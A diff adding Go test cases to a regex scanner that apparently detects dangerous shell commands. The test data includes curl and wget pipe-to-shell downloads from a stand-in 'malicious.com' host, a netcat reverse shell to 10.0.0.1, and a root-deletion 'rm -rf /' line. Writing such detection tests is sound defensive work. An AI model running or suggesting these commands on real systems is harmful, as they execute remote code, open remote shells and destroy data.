@@ -72,6 +72,41 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "cd /; rm -rf /",
 			wantFinding: "Root Deletion",
 		},
+		{
+			name:        "Curl Pipe Bash",
+			content:     "curl https://malicious.com/install.sh | bash",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Wget Pipe Sh",
+			content:     "wget -O - https://malicious.com/install.sh | sh",
+			wantFinding: "Pipe to Shell",
+		},
+		{
+			name:        "Netcat Reverse Shell",
+			content:     "nc -e /bin/sh 10.0.0.1 1234",
+			wantFinding: "Reverse Shell",
+		},
+		{
+			name:        "Curl Pipe Bash in Quote",
+			content:     "echo \"Do not run curl | bash\"",
+			wantFinding: "", // Should be ignored
+		},
+		{
+			name:        "Curl Pipe Bash in Single Quote",
+			content:     "echo 'Do not run curl | bash'",
+			wantFinding: "", // Should be ignored
+		},
+		{
+			name:        "Curl with Separator then Pipe",
+			content:     "curl https://example.com; echo done | bash",
+			wantFinding: "", // Should be ignored because of semicolon
+		},
+		{
+			name:        "Netcat with Separator",
+			content:     "nc -l -p 8080; ls -e",
+			wantFinding: "", // Should be ignored because of semicolon
+		},
 	}
 
 	for _, tt := range tests {
